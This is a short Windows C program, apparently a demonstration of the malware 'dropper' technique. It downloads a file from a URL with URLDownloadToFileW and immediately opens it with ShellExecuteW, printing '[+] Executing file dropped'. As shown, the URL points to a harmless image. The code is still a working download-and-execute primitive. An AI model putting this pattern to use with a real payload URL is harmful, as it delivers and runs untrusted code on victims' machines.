#include <tchar.h>
#include <stdio.h>
#include <urlmon.h>
#include <Windows.h>
#pragma comment(lib, "Urlmon.Lib")
#pragma comment(lib, "User32.Lib")
#pragma comment(lib, "shell32.lib")


int main()
{
	TCHAR url[] = TEXT("http://github.com/fluidicon.png");
	TCHAR filePath[MAX_PATH];

	// Current working directory
	GetCurrentDirectoryW(MAX_PATH, filePath);

	// Format path to save downloaded file
	wsprintfW(filePath, TEXT("%s\\fluidicon.png"), filePath);

	// Download file from url
	HRESULT hRes = URLDownloadToFileW(NULL, url, filePath, 0, NULL);
	Sleep(400);

	// Print result
	if (hRes == S_OK) {
		printf(" [+] File download successfully.\n");
		Sleep(400);
		printf(" [+] Saved to: %ls\n", filePath);
		Sleep(400);
		printf(" [+] Executing file dropped..!");
		Sleep(400);

		// Open file downloaded using ShellExecuteA() API.
		ShellExecuteW(NULL, L"open", filePath, NULL, NULL, 1);
	}
	else if (hRes == E_OUTOFMEMORY) {
		printf(" [-] The buffer length is invalid.\n");
	}
	else if (hRes == INET_E_DOWNLOAD_FAILURE) {
		printf(" [-] The specified resource or callback interface was invalid.\n");
	}
	else {
		printf(" [-] Unknown Error!\n");
	}

	return 0;
}

/*
** Ref:
** 1. MSDN
**    https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)
** 2. Should I use URLDownloadToFile?
**    https://stackoverflow.com/a/5185008
*/